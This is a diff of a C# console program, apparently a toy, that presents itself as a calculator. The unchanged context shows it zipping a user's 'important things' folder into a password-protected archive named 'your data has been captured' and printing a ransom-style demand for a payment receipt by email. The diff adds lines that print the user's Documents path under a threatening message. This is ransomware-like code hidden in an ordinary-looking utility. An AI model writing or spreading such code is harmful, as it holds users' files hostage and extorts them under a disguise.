@@ -11,12 +11,19 @@ namespace Calculadora
             bool executar = true;
             int contadorChamadas = 0;
 
+
+
             while (executar)
             {
                 if (contadorChamadas >= 2)
                 {
                     try
                     {
+                        string caminhoDocumentosParaMostrarApenasDeTeste = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+                     
+                        Console.WriteLine("Caminho para acabar com a sua vida se eu quisesse: ");
+                        Console.WriteLine(caminhoDocumentosParaMostrarApenasDeTeste);
+
                         string pastaOrigem = "C:\\Users\\paulo\\Desktop\\Coisas Importantes";
                         string arquivoDestino = "C:\\Users\\paulo\\Desktop\\SeusDadosForamCapturados.zip";
                         string senha = "senhabemmassa";
@@ -105,6 +112,7 @@ namespace Calculadora
             Console.WriteLine("ENCAMINHE O COMPROVANTE VIA MESMO EMAIL");
             Console.WriteLine("-------------------------------------------------");
             Console.ReadLine();
+
         }
 
         public static int Adicao(int numero1, int numero2) => numero1 + numero2;
